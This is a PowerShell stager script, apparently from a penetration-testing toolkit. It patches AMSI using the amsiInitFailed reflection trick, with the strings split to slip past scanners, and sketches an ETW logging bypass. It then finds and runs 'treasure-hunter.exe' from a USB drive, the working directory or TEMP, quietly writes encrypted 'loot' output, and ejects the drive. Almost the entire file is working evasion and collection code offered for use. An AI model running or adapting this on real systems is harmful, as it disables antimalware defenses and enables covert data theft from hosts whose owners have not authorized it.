# TREASURE-HUNTER STAGER
# Bypasses AMSI, disables ETW, then executes treasure-hunter.exe
# Usage: powershell -ep bypass -f stager.ps1
# Or:    IEX (Get-Content stager.ps1 -Raw)

# --- AMSI Bypass (patch AmsiScanBuffer) ---
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils')
    $f = $a.GetField('am' + 'siInitFailed', 'NonPublic,Static')
    $f.SetValue($null, $true)
} catch {}

# --- ETW Bypass (prevent event logging from this session) ---
try {
    $etw = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
    $etwField = $etw.GetField('m_enabled', 'NonPublic,Instance')
    # Patch not applied here -- ETW bypass is version-specific
    # Uncomment for specific .NET versions if needed
} catch {}

# --- Find treasure-hunter.exe ---
$exe = $null

# Check USB drives first
$volumes = Get-Volume -ErrorAction SilentlyContinue | Where-Object { $_.DriveLetter }
foreach ($vol in $volumes) {
    $path = "$($vol.DriveLetter):\treasure-hunter.exe"
    if (Test-Path $path) {
        $exe = $path
        break
    }
}

# Fall back to current directory
if (-not $exe -and (Test-Path ".\treasure-hunter.exe")) {
    $exe = (Resolve-Path ".\treasure-hunter.exe").Path
}

# Fall back to temp
if (-not $exe -and (Test-Path "$env:TEMP\treasure-hunter.exe")) {
    $exe = "$env:TEMP\treasure-hunter.exe"
}

if (-not $exe) {
    exit 1
}

# --- Determine output location ---
$outDir = Split-Path $exe -Parent
$outFile = Join-Path $outDir "loot.jsonl"
$htmlFile = Join-Path $outDir "report.html"

# --- Execute ---
& $exe -p smash -o $outFile --encrypt --passphrase 'engagement-key-2024' --html $htmlFile -q

# --- Eject USB if that's where exe came from ---
$driveLetter = (Split-Path $exe -Qualifier).TrimEnd(':')
$driveType = (Get-Volume -DriveLetter $driveLetter -ErrorAction SilentlyContinue).DriveType
if ($driveType -eq 'Removable') {
    (New-Object -ComObject Shell.Application).NameSpace(17).ParseName("$driveLetter`:").InvokeVerb('Eject')
}
